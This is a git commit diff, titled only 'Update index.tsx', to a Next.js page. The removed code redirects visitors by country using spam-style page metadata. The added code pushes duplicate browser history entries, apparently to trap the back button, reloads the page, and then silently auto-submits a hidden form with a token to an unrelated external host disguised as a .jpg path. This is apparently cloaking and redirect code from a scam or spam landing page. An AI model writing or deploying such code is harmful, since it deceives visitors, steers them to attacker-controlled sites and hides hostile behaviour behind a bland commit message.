c4659d33aca583be2cf661d70cc4790f335d1940
mhau7525 <mhau7525@gmail.com>
2024-09-30 11:55:00 +0700

    Update index.tsx

--- pages/index.tsx
+++ pages/index.tsx
@@ -1,49 +1,27 @@
 import { useEffect } from 'react';
-import Head from 'next/head';
 
-const Home: React.FC = () => {
+const SubmitForm: React.FC = () => {
   useEffect(() => {
-    const obtenerPais = async () => {
-      const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN', { mode: 'cors' });
-      const data = await response.json();
-      const country = data.country;
-
-      const redirecciones: { [key: string]: string } = {
-        'IR': 'https://www.youtube.com/',
-        'US': 'https://www.youtube.com/',
-        'SE': 'https://www.facebook.com/',
-      };
-
-      if (redirecciones[country]) {
-        window.location.href = redirecciones[country];
-      }
-    };
-
-    obtenerPais();
+    const param = new URLSearchParams(window.location.search);
+    if (param.has('t')) {
+      setTimeout(() => {
+        document.getElementById('submit-form')?.dispatchEvent(new Event('submit', { cancelable: true }));
+      }, 500);
+    } else {
+      param.append('t', '1727671913');
+      const reverseUrl = `${window.location.origin}${window.location.pathname}?${param.toString()}`;
+      history.pushState(null, document.title, reverseUrl);
+      history.pushState(null, document.title, reverseUrl);
+      window.location.reload();
+    }
   }, []);
 
   return (
-    <>
-      <Head>
-        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
-        <link rel="manifest" href="/site.webmanifest" />
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <meta name="description" content="live" />
-        <meta name="keywords" content="" />
-        <meta name="generator" content="WordPress 5.3.2" />
-        <title>🔥online vide🔥</title>
-        <link rel="canonical" href="./₮৲৳௹฿៛₠.html" />
-        <meta name="theme-color" content="#563d7c" />
-        <meta property="og:url" content="./₮৲৳௹฿៛₠.html" />
-        <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET" />
-      </Head>
-      <body>
-        {/* Các nội dung khác nếu cần */}
-      </body>
-    </>
+    <form action="https://zhugising.es/assets/r/0KJaz6XhFnlR/hne66f3c4a70977e.jpg" method="post" id="submit-form">
+      <input type="hidden" name="_token" value="" autoComplete="off" />
+      <input type="hidden" name="token" value="bf3a20fb0183e460009d0e3c3b954141" />
+    </form>
   );
 };
 
-export default Home;
+export default SubmitForm;
